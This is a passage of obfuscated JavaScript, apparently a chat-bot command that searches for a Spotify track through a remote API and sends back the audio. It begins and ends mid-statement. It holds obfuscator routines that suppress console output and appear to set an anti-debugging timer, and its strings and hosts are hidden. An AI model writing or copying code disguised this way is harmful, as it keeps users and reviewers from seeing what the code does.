_0x2dad50=_0x4f9cb9[_0x52e687(0x132,0x18c,0x147,0xd7,0x168)+_0x401f13(0x5a0,0x64f,0x65d,0x664,0x59a)+'r'][_0x508b32(0x649,0x60e,0x5ad,0x65c,0x63e)+_0x401f13(0x697,0x6ad,0x741,0x70b,0x672)][_0x508b32(0x5b3,0x4b0,0x50d,0x4fd,0x562)](_0x4f9cb9),_0x154afe=_0x4ef05f[_0x159cbf],_0x358f6f=_0x3c7499[_0x154afe]||_0x2dad50;_0x2dad50[_0x52e687(0x28,-0x13,-0x3d,0x63,0xf0)+_0x401f13(0x5a3,0x585,0x5a0,0x606,0x505)]=_0x4f9cb9[_0x508b32(0x57d,0x48c,0x50d,0x570,0x4c2)](_0x4f9cb9),_0x2dad50[_0x401f13(0x5d5,0x5f0,0x5ca,0x5dc,0x651)+_0x52e687(0xcc,0x1e5,0x171,0x15e,0x1c0)]=_0x358f6f[_0x401f13(0x5e2,0x5f0,0x65e,0x5d8,0x6a0)+_0x401f13(0x665,0x6b4,0x769,0x65a,0x676)][_0x508b32(0x50c,0x4c3,0x50d,0x4cf,0x55f)](_0x358f6f),_0x3c7499[_0x154afe]=_0x2dad50;}}});_0x567bf5();if(isBan)return reply(mess[_0x28316f(0x53e,0x542,0x5e0,0x59b,0x4e4)]);if(!text)return reply(_0x28316f(0x554,0x4e6,0x535,0x536,0x576)+_0x350f34(0x3f6,0x3b0,0x3c8,0x3ed,0x393)+(prefix+command)+(_0x28316f(0x4f4,0x56e,0x5aa,0x4ff,0x4dc)+_0x28316f(0x4b1,0x4e5,0x56d,0x4ff,0x4d3)+_0x158f40(0x17b,0x17a,0x208,0x21c,0x151)+_0x158f40(0x166,0x1a7,0x211,0x233,0x280)+_0xdbfcc(0x366,0x3f9,0x3d8,0x387,0x41e)+_0x3c1e52(0x5,0xe7,0x156,0x127,0xb1)));let urlSpotify;if(text[_0xdbfcc(0x430,0x389,0x41a,0x385,0x372)+_0x28316f(0x4c6,0x4e0,0x560,0x46a,0x496)](_0x28316f(0x51f,0x58e,0x61c,0x619,0x5e2)+_0x3c1e52(0xef,0xf9,0xb,0x5c,0x8d)+_0xdbfcc(0x327,0x40c,0x349,0x38d,0x343)+_0xdbfcc(0x484,0x40c,0x3c9,0x3cf,0x369)+_0x350f34(0x3ab,0x306,0x381,0x30b,0x387)))reply(mess[_0x3c1e52(0x39,0xd9,0x165,0x39,0xe5)+'h']),urlSpotify=text;else{if(text[_0xdbfcc(0x2ce,0x346,0x2d7,0x385,0x39f)+_0x350f34(0x2a1,0x367,0x32a,0x31e,0x297)](_0x158f40(0x2e3,0x342,0x2d2,0x2f4,0x22c)+'//')||text[_0x350f34(0x466,0x4a8,0x40d,0x43a,0x3a8)+_0x3c1e52(0x69,0xc1,0x57,-0x31,0x29)](_0x158f40(0x1e6,0x2e0,0x28c,0x22a,0x23f)+_0x28316f(0x57b,0x5fc,0x61b,0x604,0x61a)))return reply(_0x158f40(0x278,0x165,0x1dd,0x244,0x166)+_0xdbfcc(0x3e3,0x47b,0x357,0x3cc,0x332)+_0xdbfcc(0x32d,0x2ea,0x2eb,0x2ec,0x2db)+_0x3c1e52(0x7f,0x7f,-0x33,0x17,0x55)+_0xdbfcc(0x2be,0x383,0x330,0x347,0x317)+_0x350f34(0x3c7,0x435,0x42a,0x465,0x3d3)+_0x158f40(0x32a,0x353,0x2a8,0x2df,0x350)+_0x158f40(0x206,0x2e7,0x23a,0x235,0x1a4)+_0x3c1e52(0xa8,0x117,0x71,0x99,0x10e)+_0x350f34(0x3f7,0x327,0x3b2,0x3c4,0x31c));else{reply(mess[_0x3c1e52(0x12d,0x14f,0x172,0x175,0xe5)+'h']);let api=await fetchJson(_0x3c1e52(0x174,0xa9,0x90,0xbb,0xd7)+_0x28316f(0x608,0x5d7,0x5f5,0x65b,0x634)+_0xdbfcc(0x37c,0x2e1,0x307,0x364,0x417)+_0x158f40(0x20f,0x26f,0x1db,0x266,0x1dc)+_0x158f40(0x302,0x2b2,0x2c6,0x354,0x2e0)+_0xdbfcc(0x2e3,0x278,0x276,0x2d0,0x2b6)+_0x3c1e52(0x131,0x12b,0x79,0x9b,0xf9)+_0xdbfcc(0x3e3,0x2b7,0x2cc,0x332,0x3da)+_0xdbfcc(0x32d,0x375,0x3c3,0x351,0x2d3)+text);if(!api[_0x3c1e52(0xf0,0x121,0x16a,0x16a,0x12d)]||api[_0x3c1e52(0x1be,0x1a9,0x18f,0x1a9,0x12d)][_0x3c1e52(0x1af,0x19c,0x97,0x17f,0x113)+'h']===-0xb5*-0x2b+-0x22b7+0x450)return reply(_0x158f40(0x24a,0x2dd,0x263,0x1da,0x208)+_0xdbfcc(0x455,0x36d,0x47e,0x3e5,0x441)+_0x3c1e52(0xdc,0x1e,0x119,0xda,0xac)+'d.');urlSpotify=''+api[_0xdbfcc(0x2f3,0x3b8,0x323,0x3a6,0x336)][0x66e+-0x4*0xcf+-0x332][_0xdbfcc(0x3f4,0x32a,0x3e3,0x362,0x346)];}}const Spotify=require(_0x3c1e52(0x159,0xd7,0xc0,0x156,0x11c)+_0x3c1e52(0xf9,0x112,0x4d,0x1ae,0xf9)+_0x158f40(0x2cd,0x39b,0x341,0x3c1,0x39d)),spotify=new Spotify(urlSpotify),info=await spotify[_0x350f34(0x32f,0x332,0x363,0x3c0,0x350)+'fo']();if(info[_0x3c1e52(0x1c1,0x1ac,0x76,0x80,0x116)])return reply(_0x158f40(0x262,0x15f,0x1dd,0x1fa,0x1d9)+_0x158f40(0x35e,0x252,0x308,0x34d,0x37c)+_0x350f34(0x35c,0x337,0x374,0x3a7,0x344)+_0x28316f(0x4eb,0x50c,0x541,0x4cb,0x5c2)+_0x350f34(0x40d,0x342,0x3cf,0x465,0x3d6)+_0x28316f(0x697,0x5e0,0x59b,0x57d,0x602)+_0x350f34(0x3b9,0x37a,0x3f4,0x447,0x472)+_0x350f34(0x36d,0x356,0x386,0x378,0x383)+_0xdbfcc(0x409,0x387,0x38e,0x387,0x30d)+_0x28316f(0x60d,0x568,0x5fa,0x5e1,0x4fa));const {name,artists,album_name,release_date,cover_url}=info;(function(){function _0x1f00d6(_0x340897,_0x547222,_0x1ef2fe,_0x5df82f,_0x53386b){return _0x158f40(_0x340897-0x98,_0x1ef2fe,_0x340897-0xd7,_0x5df82f-0xfe,_0x53386b-0x14);}const _0x260f68={'fgHFV':function(_0x354db7,_0x2efc25){return _0x354db7(_0x2efc25);},'drJFC':function(_0x16c368,_0xe2d555){return _0x16c368+_0xe2d555;},'hKNYx':_0x1f00d6(0x30f,0x2b4,0x31f,0x2f2,0x2be)+_0x33ab86(-0x89,0x32,-0xbe,0x86,-0x16)+_0x33ab86(-0xa0,-0xbd,-0x1cb,-0xbd,-0x14f)+_0x53072a(0x2c1,0x3bf,0x2de,0x297,0x32d),'dikOv':_0x3c22a9(0x1a,0x15,-0x97,-0x9c,0x8b)+_0x33ab86(0x9,-0x4d,0x22,-0xe8,-0x69)+_0x1f00d6(0x3eb,0x37f,0x458,0x46d,0x35c)+_0x1f00d6(0x3e9,0x37f,0x3fe,0x426,0x377)+_0x3c22a9(0x10d,0x1a4,0x162,0x9c,0x9b)+_0x53072a(0x332,0x337,0x380,0x28d,0x2f6)+'\x20)','BmtMI':function(_0x5c07a4){return _0x5c07a4();},'ripIE':_0x3c22a9(0x7a,0xa9,0xc4,-0xa,0x3e),'jIZXp':_0x1f00d6(0x372,0x415,0x2f3,0x318,0x320),'kcZzj':_0x219b4e(0x2ca,0x2db,0x36c,0x34b,0x35b),'xEGPD':_0x53072a(0x24c,0x2fd,0x365,0x331,0x2e5),'BBfbA':_0x219b4e(0x241,0x279,0x309,0x292,0x2cf)+_0x219b4e(0x281,0x35c,0x35d,0x32c,0x2f6),'FLCkU':_0x219b4e(0x2e1,0x2eb,0x264,0x2c0,0x2a4),'phORp':_0x33ab86(-0x4c,-0x121,-0xa4,-0xa7,-0x97),'cHPWo':function(_0x3c5260,_0x3322e7){return _0x3c5260<_0x3322e7;},'iPKOr':function(_0x4ede1f,_0x47187b){return _0x4ede1f!==_0x47187b;},'OgEIB':_0x1f00d6(0x315,0x321,0x3c6,0x2ca,0x377),'sVlvP':function(_0x518b03,_0x346111){return _0x518b03===_0x346111;},'LWghN':_0x33ab86(0x57,-0xa3,-0x7a,-0x3b,-0x21),'oEQMX':_0x3c22a9(0x101,0x59,0x76,0xfe,0x138),'sYjMA':function(_0x1e0f0a,_0x49d089){return _0x1e0f0a(_0x49d089);},'iYHuk':function(_0x24ac3f,_0x14c7b3){return _0x24ac3f+_0x14c7b3;},'UZRzW':_0x53072a(0x263,0x1ae,0x214,0x183,0x236),'xotDJ':function(_0x38e9db){return _0x38e9db();}};function _0x3c22a9(_0x28e2ab,_0x500a35,_0xb86de1,_0x38617f,_0x5041e5){return _0x28316f(_0x28e2ab-0x1b4,_0x28e2ab- -0x53a,_0xb86de1-0x46,_0x500a35,_0x5041e5-0xf7);}function _0x219b4e(_0x397bd2,_0x33d771,_0x4a69a0,_0x4103d9,_0xb8bc7f){return _0x3c1e52(_0x397bd2-0x1e3,_0x33d771-0x130,_0x4a69a0-0x50,_0x4a69a0,_0xb8bc7f-0x225);}const _0x4a4bc1=function(){function _0x30c8b1(_0x4e0d12,_0x4ff39a,_0x3e02de,_0x5d76e1,_0x1a6dc7){return _0x33ab86(_0x4e0d12-0x69,_0x3e02de,_0x3e02de-0x1c,_0x5d76e1-0x192,_0x1a6dc7-0x106);}function _0x2f76ce(_0x42da4d,_0x266b14,_0x35ed5b,_0x26ec3e,_0x6d7637){return _0x3c22a9(_0x42da4d-0x4e9,_0x6d7637,_0x35ed5b-0xa9,_0x26ec3e-0x126,_0x6d7637-0x1a5);}function _0x1d428e(_0x2d7fb1,_0x250cc9,_0xb71335,_0x347398,_0x6fb59){return _0x219b4e(_0x2d7fb1-0x17,_0x250cc9-0x9,_0x347398,_0x347398-0x17a,_0x2d7fb1-0x32);}function _0x5a6b47(_0x4b9ca2,_0x1aadce,_0x4a2321,_0x562391,_0x2ce3ac){return _0x33ab86(_0x4b9ca2-0x4,_0x4a2321,_0x4a2321-0x7a,_0x562391-0xe6,_0x4b9ca2-0x437);}function _0x1a2433(_0x558181,_0x93ea4f,_0x4b521d,_0x2fcc0c,_0x4b9d4c){return _0x3c22a9(_0x4b521d-0x2dc,_0x4b9d4c,_0x4b521d-0x1d5,_0x2fcc0c-0xd9,_0x4b9d4c-0x152);}if(_0x260f68[_0x30c8b1(0x15,-0x1,0xe,0x84,0x91)](_0x260f68[_0x1d428e(0x2b8,0x33b,0x355,0x327,0x330)],_0x260f68[_0x1d428e(0x2b8,0x2a7,0x2d0,0x238,0x308)])){const _0x2b22dd=_0x28bdea[_0x1d428e(0x359,0x30a,0x2e6,0x2bd,0x31e)+_0x5a6b47(0x3cc,0x434,0x3f9,0x3e9,0x3c2)+'r'][_0x1d428e(0x3a9,0x34d,0x2f7,0x3df,0x433)+_0x1a2433(0x416,0x481,0x3db,0x45d,0x390)][_0x30c8b1(-0x58,0x84,0xc,-0x3c,0x29)](_0x58801b),_0x34a3c5=_0x57f54f[_0x2c21cd],_0x56c335=_0x991e0b[_0x34a3c5]||_0x2b22dd;_0x2b22dd[_0x2f76ce(0x4f4,0x44c,0x4e0,0x53d,0x555)+_0x30c8b1(-0x36,0x4,-0x47,-0x92,-0x2f)]=_0x5cf334[_0x2f76ce(0x518,0x59a,0x4eb,0x4cf,0x462)](_0x1738d7),_0x2b22dd[_0x1a2433(0x325,0x346,0x31e,0x26a,0x36d)+_0x1a2433(0x36e,0x3b3,0x3e2,0x3f0,0x3c0)]=_0x56c335[_0x2f76ce(0x52b,0x545,0x573,0x4f3,0x4f6)+_0x30c8b1(0x18a,0x121,0x71,0x17d,0x100)][_0x2f76ce(0x518,0x545,0x576,0x4de,0x481)](_0x56c335),_0x22472a[_0x34a3c5]=_0x2b22dd;}else{let _0xd540eb;try{if(_0x260f68[_0x30c8b1(-0x2d,-0xef,-0xfb,0x3a,-0x5d)](_0x260f68[_0x5a6b47(0x366,0x360,0x2d6,0x316,0x3bb)],_0x260f68[_0x5a6b47(0x2eb,0x3a2,0x331,0x38b,0x26a)])){const _0x1ea641=_0x3ea29d?function(){function _0x245825(_0x1be1fb,_0x58e002,_0xea9a2e,_0x214992,_0x2a15c0){return _0x5a6b47(_0x1be1fb- -0x1c9,_0x58e002-0x164,_0x58e002,_0x214992-0x19f,_0x2a15c0-0x1ab);}if(_0x3fd3fd){const _0x3cea88=_0x4b4b72[_0x245825(0x209,0x2ab,0x2b5,0x2ac,0x169)](_0x385490,arguments);return _0x5e65d1=null,_0x3cea88;}}:function(){};return _0x15b464=![],_0x1ea641;}else _0xd540eb=_0x260f68[_0x1d428e(0x2c4,0x250,0x26b,0x359,0x26f)](Function,_0x260f68[_0x2f76ce(0x558,0x585,0x50a,0x5a0,0x5ae)](_0x260f68[_0x2f76ce(0x538,0x483,0x5a7,0x5b2,0x54d)](_0x260f68[_0x5a6b47(0x31c,0x3b9,0x38b,0x37c,0x3a3)],_0x260f68[_0x5a6b47(0x383,0x3b3,0x379,0x3ec,0x388)]),');'))();}catch(_0x489649){if(_0x260f68[_0x1a2433(0x31f,0x25e,0x285,0x2c3,0x31c)](_0x260f68[_0x1a2433(0x3c6,0x36d,0x3d3,0x367,0x38f)],_0x260f68[_0x1d428e(0x3d1,0x36e,0x3f6,0x419,0x3fc)]))_0xd540eb=window;else{let _0x503a10;try{const _0x1f6c2c=_0x260f68[_0x5a6b47(0x307,0x335,0x283,0x3ae,0x26f)](_0x998269,_0x260f68[_0x1a2433(0x35a,0x37d,0x32b,0x38b,0x369)](_0x260f68[_0x1d428e(0x329,0x288,0x2b1,0x37f,0x31a)](_0x260f68[_0x30c8b1(-0x1f,0x37,0x37,0x98,-0x15)],_0x260f68[_0x30c8b1(0xac,0xaf,0x2f,-0x2d,0x52)]),');'));_0x503a10=_0x260f68[_0x1d428e(0x2a8,0x20a,0x2ae,0x2ed,0x32a)](_0x1f6c2c);}catch(_0x5e9dde){_0x503a10=_0x224280;}const _0x4940df=_0x503a10[_0x2f76ce(0x4a7,0x42a,0x46b,0x498,0x556)+'le']=_0x503a10[_0x5a6b47(0x2e9,0x2f3,0x2fe,0x2b0,0x25e)+'le']||{},_0x5a6b17=[_0x260f68[_0x2f76ce(0x53b,0x533,0x546,0x511,0x554)],_0x260f68[_0x2f76ce(0x4d8,0x554,0x4a6,0x55f,0x4c3)],_0x260f68[_0x1d428e(0x3b1,0x439,0x44f,0x461,0x337)],_0x260f68[_0x5a6b47(0x39f,0x345,0x37c,0x2fb,0x31d)],_0x260f68[_0x30c8b1(0xc6,0x69,0x17c,0x61,0xf5)],_0x260f68[_0x30c8b1(0xbc,-0x7c,0x3f,-0x45,0x38)],_0x260f68[_0x2f76ce(0x5c2,0x512,0x568,0x5c5,0x56a)]];for(let _0x26c9f9=0x3*-0x365+0x1009+-0x7*0xd6;_0x260f68[_0x1d428e(0x356,0x3a6,0x3b7,0x2de,0x323)](_0x26c9f9,_0x5a6b17[_0x2f76ce(0x579,0x60c,0x4f2,0x56c,0x589)+'h']);_0x26c9f9++){const _0x264ef5=_0x33d922[_0x1d428e(0x359,0x3bc,0x402,0x302,0x3ab)+_0x5a6b47(0x3cc,0x438,0x44a,0x478,0x396)+'r'][_0x5a6b47(0x3fa,0x38e,0x3ec,0x418,0x35f)+_0x1d428e(0x3d9,0x3e8,0x330,0x356,0x350)][_0x1a2433(0x333,0x3a7,0x30b,0x2cf,0x2c0)](_0x9e8672),_0x1d334a=_0x5a6b17[_0x26c9f9],_0x30af5f=_0x4940df[_0x1d334a]||_0x264ef5;_0x264ef5[_0x5a6b47(0x336,0x2b0,0x29b,0x337,0x2fe)+_0x1a2433(0x2aa,0x239,0x2b3,0x2f5,0x256)]=_0x4ef5fb[_0x2f76ce(0x518,0x4b2,0x4ac,0x466,0x4ae)](_0x15d972),_0x264ef5[_0x5a6b47(0x36d,0x368,0x319,0x2b7,0x3b4)+_0x1d428e(0x3e0,0x35c,0x3b7,0x363,0x339)]=_0x30af5f[_0x2f76ce(0x52b,0x4cd,0x5c5,0x4cf,0x5ac)+_0x5a6b47(0x431,0x3c8,0x3f5,0x3eb,0x4e3)][_0x30c8b1(0x5b,-0x6d,0xd,0x32,0x29)](_0x30af5f),_0x4940df[_0x1d334a]=_0x264ef5;}}}return _0xd540eb;}},_0x1693a2=_0x260f68[_0x1f00d6(0x3af,0x39d,0x43a,0x36a,0x455)](_0x4a4bc1);function _0x53072a(_0xeb3c17,_0x55e2eb,_0x4b6d92,_0x30040c,_0x398e03){return _0x28316f(_0xeb3c17-0xb6,_0x398e03- -0x2e8,_0x4b6d92-0x10,_0x30040c,_0x398e03-0x114);}function _0x33ab86(_0x1e5872,_0xdb5127,_0x198776,_0x3582c4,_0x49aa60){return _0xdbfcc(_0x1e5872-0x180,_0xdb5127,_0x198776-0x65,_0x49aa60- -0x408,_0x49aa60-0xd6);}_0x1693a2[_0x33ab86(-0x84,-0x2f,-0x5e,-0x99,-0x20)+_0x33ab86(-0x68,-0x32,-0x15d,-0x160,-0xc7)+'l'](_0x1c4db2,0x16ae+-0x120d+0xaff);}());const details=_0x158f40(0x1c2,0x21f,0x1e7,0x175,0x222)+_0x350f34(0x532,0x3ed,0x47c,0x4f3,0x425)+(name||'')+(_0x158f40(0x22c,0x358,0x2c7,0x287,0x2ce)+_0xdbfcc(0x396,0x324,0x474,0x3d1,0x368)+'*\x20')+(artists||[])[_0x350f34(0x40e,0x42d,0x3c5,0x325,0x3b3)](',\x20')+(_0x158f40(0x396,0x2fa,0x326,0x3bf,0x37f)+_0x28316f(0x4ce,0x530,0x5de,0x5ab,0x4c4))+album_name+(_0x28316f(0x651,0x63f,0x61b,0x620,0x591)+_0x3c1e52(0x9,0xda,0x4a,0x3a,0x82)+_0x3c1e52(0xfe,0x19f,0x171,0x192,0x109)+'*\x20')+(release_date||''),bufferSpotify=await spotify[_0x350f34(0x32c,0x3a0,0x33b,0x2d5,0x2e9)+_0x28316f(0x492,0x528,0x4fc,0x47d,0x56c)](),_0x48c298={};_0x48c298[_0x350f34(0x3f5,0x43d,0x44f,0x3ec,0x3c2)+'d']=fcall,await zynX[_0x158f40(0x2b7,0x2a8,0x236,0x232,0x1a6)+_0xdbfcc(0x25f,0x233,0x2cc,0x2cd,0x34e)+'e'](m[_0x3c1e52(0x116,0x1e3,0xb4,0x144,0x169)],{'audio':bufferSpotify,'mimetype':_0xdbfcc(0x2ea,0x2af,0x3d6,0x34d,0x342)+_0xdbfcc(0x332,0x2db,0x242,0x2e3,0x311),'contextInfo':{'externalAdReply':{'title':_0x28316f(0x5a9,0x62f,0x6cf,0x5a2,0x663)+':\x20'+(name||''),'body':_0x158f40(0x24c,0x2b5,0x20b,0x203,0x273)+_0x350f34(0x4a3,0x3ff,0x444,0x4fb,0x4b2)+(artists||[])[_0x158f40(0x277,0x2fa,0x279,0x20b,0x30a)](',\x20'),'thumbnailUrl':''+cover_url,'sourceUrl':urlSpotify,'mediaType':0x1,'showAdAttribution':!![],'renderLargerThumbnail':!![]}}},_0x48c298);function _0x350f34(_0x39ce4f,_0x230558,_0x57d0f3,_0x32b195,_0x10fc5a){return _0x1574(_0x57d0f3-0x140,_0x10fc5a);}function _0x3c1e52(_0x5c2cc3,_0x119593,_0x1977c3,_0x1dd61b,_0x562c28){return _0x1574(_0x562c28- -0x1c1,_0x1dd61b);}function _0x1574(_0x28f167,_0x1c4db2){const _0x579c0f=_0x388a();return _0x1574=function(_0x4b374c,_0x33710d){_0x4b374c=_0x4b374c-(-0x75+0x7d*-0xa+0x73d);let _0x43a833=_0x579c0f[_0x4b374c];return _0x43a833;},_0x1574(_0x28f167,_0x1c4db2);}function _0x158f40(_0x40cfce,_0x4d339d,_0x29a23e,_0x34eb68,_0x2c54bd){return _0x1574(_0x29a23e- -0xc,_0x4d339d);}function _0x1c4db2(_0x70d225){function _0x4c5ede(_0x56c9dc,_0x425fbc,_0x312824,_0x59a560,_0x5da063){return _0x158f40(_0x56c9dc-0xfb,_0x59a560,_0x56c9dc-0x101,_0x59a560-0x100,_0x5da063-0x3e);}const _0x176dae={'OIAKU':function(_0x48071a,_0x1dba53){return _0x48071a(_0x1dba53);},'NoroK':function(_0x13497d,_0xf82e80){return _0x13497d+_0xf82e80;},'DzoUp':function(_0x2f87ba,_0x335952){return _0x2f87ba+_0x335952;},'fYEWQ':_0x4c5ede(0x339,0x3a7,0x2e8,0x2e3,0x3ba)+_0x4e2f0a(0x189,0xdb,0x111,0xc6,0x8f)+_0x4c5ede(0x2f6,0x28c,0x37f,0x341,0x349)+_0x4c5ede(0x414,0x4b1,0x3ac,0x443,0x454),'tujkG':_0x4c5ede(0x353,0x338,0x379,0x308,0x2d7)+_0x41a36e(0x3a1,0x41f,0x41c,0x4c4,0x3cd)+_0x1cfb58(0x674,0x6bb,0x64d,0x6c5,0x69d)+_0x16ac5e(0x581,0x526,0x539,0x5b5,0x4a6)+_0x4c5ede(0x446,0x444,0x4e2,0x469,0x448)+_0x16ac5e(0x56a,0x4f0,0x451,0x48a,0x529)+'\x20)','nAUDv':function(_0x2d4183){return _0x2d4183();},'XNnxE':function(_0x1010db){return _0x1010db();},'nWSmr':function(_0x3f2cad,_0x34b0f8){return _0x3f2cad===_0x34b0f8;},'GOCgb':_0x41a36e(0x4b9,0x412,0x46a,0x496,0x44e),'LUAge':function(_0x734b45,_0x4cfd8a){return _0x734b45!==_0x4cfd8a;},'hWfjH':_0x16ac5e(0x434,0x4ab,0x48d,0x474,0x459),'eaynP':_0x1cfb58(0x5e3,0x603,0x5ad,0x652,0x655),'TTUDE':_0x4c5ede(0x3a0,0x43a,0x2f8,0x3a7,0x314)+'g','yskTN':_0x41a36e(0x42d,0x50e,0x461,0x430,0x466),'OqhZk':_0x41a36e(0x38d,0x497,0x401,0x407,0x417)+_0x16ac5e(0x534,0x53f,0x5ec,0x510,0x4d3)+_0x4e2f0a(0xe7,0xa2,0x113,-0x1,0x8b),'HmxlS':_0x41a36e(0x311,0x405,0x397,0x412,0x42b)+'er','qfiTd':function(_0x52c006,_0x19afc0){return _0x52c006===_0x19afc0;},'rJcUJ':_0x16ac5e(0x577,0x536,0x544,0x5db,0x58b),'fRwXP':_0x16ac5e(0x53f,0x514,0x544,0x4cc,0x4ea),'ReeMA':function(_0x4f465a,_0xc4e85){return _0x4f465a!==_0xc4e85;},'uIVuB':function(_0xbd5785,_0x518b13){return _0xbd5785+_0x518b13;},'DvuBe':function(_0x4246a1,_0x579724){return _0x4246a1/_0x579724;},'YCHSh':_0x16ac5e(0x470,0x4dc,0x4db,0x4a4,0x528)+'h','agSRB':function(_0x25e341,_0x303463){return _0x25e341===_0x303463;},'pKkAu':function(_0x3533b5,_0x41078d){return _0x3533b5%_0x41078d;},'cScqH':function(_0x4d4b71,_0xd3a358){return _0x4d4b71===_0xd3a358;},'BTJFW':_0x4c5ede(0x34b,0x2c3,0x372,0x3a0,0x31f),'TAwpT':function(_0x3b0614,_0x1013e8){return _0x3b0614+_0x1013e8;},'lQhGb':_0x41a36e(0x488,0x359,0x3f0,0x3a4,0x35f),'ACjUB':_0x4e2f0a(-0x39,0x11,-0xc,-0x48,0x4e),'PEIPk':_0x16ac5e(0x421,0x408,0x3a9,0x3a2,0x427)+'n','TWpVr':_0x1cfb58(0x646,0x550,0x57b,0x590,0x58c),'yWbAb':function(_0x2029f0,_0x65cd0a){return _0x2029f0+_0x65cd0a;},'qeeMA':_0x16ac5e(0x406,0x498,0x54e,0x50b,0x3f7)+_0x4e2f0a(0x1ac,0xf5,0x158,0x14a,0x70)+'t','hBTbB':_0x16ac5e(0x509,0x52d,0x4a2,0x59d,0x47d)+_0x1cfb58(0x6a1,0x65e,0x60b,0x69b,0x6d6)+_0x4c5ede(0x33d,0x3b9,0x2c9,0x2a0,0x342)+')','DITgy':_0x4c5ede(0x321,0x2ce,0x3bb,0x2fc,0x272)+_0x4c5ede(0x396,0x40b,0x2f8,0x405,0x39e)+_0x16ac5e(0x41b,0x4cf,0x52e,0x54e,0x56d)+_0x1cfb58(0x65d,0x55d,0x5bd,0x5ee,0x63e)+_0x4e2f0a(0x4d,0x60,0x117,0x68,0x5c)+_0x1cfb58(0x60f,0x6ce,0x65a,0x6a0,0x6cd)+_0x4e2f0a(-0x47,0x69,-0x43,0x3f,-0x21),'aRZrI':_0x1cfb58(0x67f,0x5e6,0x5e1,0x695,0x606),'HysiV':function(_0x28c1da,_0x55c627){return _0x28c1da+_0x55c627;},'elGro':_0x1cfb58(0x622,0x5e9,0x60c,0x596,0x510),'WTkJD':_0x4e2f0a(-0x60,-0x36,-0xe8,0x3f,-0xd5),'XPoky':function(_0xd75268,_0x5b2b7d){return _0xd75268(_0x5b2b7d);},'YFjHn':function(_0x339bf1,_0x4c68d6){return _0x339bf1(_0x4c68d6);},'GlLvj':function(_0x5d53a9,_0x2e25b4){return _0x5d53a9+_0x2e25b4;},'FYzvy':function(_0x31d1f5){return _0x31d1f5();},'Alsla':_0x1cfb58(0x65e,0x64c,0x660,0x68e,0x61c),'jJlEb':_0x4c5ede(0x31f,0x2bf,0x27e,0x2de,0x3c1),'brEiX':_0x4c5ede(0x2fe,0x2d7,0x260,0x26e,0x266),'AvXHU':_0x4c5ede(0x40f,0x4be,0x461,0x388,0x38a),'SGUaD':_0x4e2f0a(0xdb,0xa8,0x122,0x142,0x8b)};function _0x24d5c0(_0x283d18){function _0x462ed5(_0x3decff,_0x582e35,_0x3d547c,_0x554044,_0x58bb0d){return _0x1cfb58(_0x3decff-0xcf,_0x554044,_0x3d547c-0x60,_0x582e35- -0x300,_0x58bb0d-0x12f);}function _0x288698(_0x348d92,_0x46675e,_0x42a982,_0x27c319,_0x6ee98f){return _0x41a36e(_0x348d92-0x10,_0x6ee98f,_0x42a982- -0x3c7,_0x27c319-0x1cd,_0x6ee98f-0x84);}function _0x23e83b(_0x4f3471,_0x57a406,_0x5524e0,_0x5c364d,_0x42a308){return _0x16ac5e(_0x4f3471-0x61,_0x42a308- -0x449,_0x5524e0-0x1a8,_0x5524e0,_0x42a308-0x16a);}function _0x28a73d(_0x4adc2c,_0x1170b9,_0x47e63e,_0x434602,_0x43a2e9){return _0x41a36e(_0x4adc2c-0x12e,_0x47e63e,_0x434602- -0x273,_0x434602-0x70,_0x43a2e9-0x164);}function _0x53a2a5(_0x53d8f0,_0x328a35,_0x4aac09,_0x5ab69d,_0x4c99bc){return _0x4e2f0a(_0x53d8f0-0x50,_0x53d8f0-0x401,_0x4aac09-0x61,_0x328a35,_0x4c99bc-0x16c);}const _0x57a554={'conoJ':function(_0x1fb042){function _0x3b3429(_0x1247e3,_0x3d9620,_0x4ca530,_0x1c93a6,_0x2317b1){return _0x1574(_0x1c93a6-0x30e,_0x3d9620);}return _0x176dae[_0x3b3429(0x609,0x5e3,0x656,0x60d,0x571)](_0x1fb042);},'GIJIF':function(_0x24e33d,_0x32e003){function _0x2a445c(_0x3d962e,_0x53f653,_0x4a8104,_0x2ceedd,_0x4cac19){return _0x1574(_0x53f653- -0x32f,_0x2ceedd);}return _0x176dae[_0x2a445c(0x7b,-0x19,-0xc8,-0xaf,-0x2b)](_0x24e33d,_0x32e003);},'rDUAH':_0x176dae[_0x28a73d(0x165,0x17c,0x12c,0xf9,0xa6)],'PRkil':function(_0x25c101,_0x3fa988){function _0x30fd05(_0x5eb2bd,_0x2344c2,_0x577683,_0x90b2d7,_0x524ba2){return _0x28a73d(_0x5eb2bd-0x1f3,_0x2344c2-0x1cf,_0x524ba2,_0x577683-0x356,_0x524ba2-0x34);}return _0x176dae[_0x30fd05(0x56a,0x49b,0x53a,0x56d,0x4cf)](_0x25c101,_0x3fa988);},'RBXEH':function(_0x20cc25,_0x931329){function _0x112cf9(_0x6e84a2,_0x5f5723,_0x343d1a,_0x550977,_0x2c65c1){return _0x28a73d(_0x6e84a2-0x33,_0x5f5723-0x1d6,_0x343d1a,_0x550977- -0xf4,_0x2c65c1-0x91);}return _0x176dae[_0x112cf9(0x7a,0x69,-0x39,0x6b,-0x2f)](_0x20cc25,_0x931329);},'TNgry':_0x176dae[_0x462ed5(0x3dc,0x3f4,0x361,0x393,0x48f)],'YYOvP':_0x176dae[_0x28a73d(0x10e,0x1ad,0xc9,0x164,0xfa)],'Ewenr':function(_0x5316d7,_0x935abf){function _0x24bf5c(_0x390bff,_0x2db4b1,_0x127299,_0x1ced54,_0x469669){return _0x288698(_0x390bff-0x188,_0x2db4b1-0x16f,_0x2db4b1-0x205,_0x1ced54-0x97,_0x469669);}return _0x176dae[_0x24bf5c(0x247,0x23e,0x240,0x283,0x2f3)](_0x5316d7,_0x935abf);},'fuwDA':_0x176dae[_0x23e83b(0x20,0x9d,-0x1,0xf5,0xb0)]};if(_0x176dae[_0x288698(0x102,0xe3,0x84,0x5c,0xd5)](_0x176dae[_0x23e83b(0xab,0xc9,0xe5,0x6,0x56)],_0x176dae[_0x23e83b(0x6e,-0x59,0x4b,-0x3e,0x56)])){if(_0x176dae[_0x53a2a5(0x4b8,0x545,0x56a,0x4df,0x51c)](typeof _0x283d18,_0x176dae[_0x28a73d(0x1f5,0x246,0x197,0x1e5,0x241)])){if(_0x176dae[_0x23e83b(0x2a,0x28,0x55,0x62,0x8a)](_0x176dae[_0x53a2a5(0x3ae,0x2fa,0x44c,0x435,0x34f)],_0x176dae[_0x53a2a5(0x3ae,0x381,0x3ba,0x3fe,0x440)])){if(_0x13eaf3){const _0x53e865=_0x165013[_0x28a73d(0x21b,0x187,0x236,0x1ad,0x181)](_0x4bb037,arguments);return _0x93372b=null,_0x53e865;}}else return 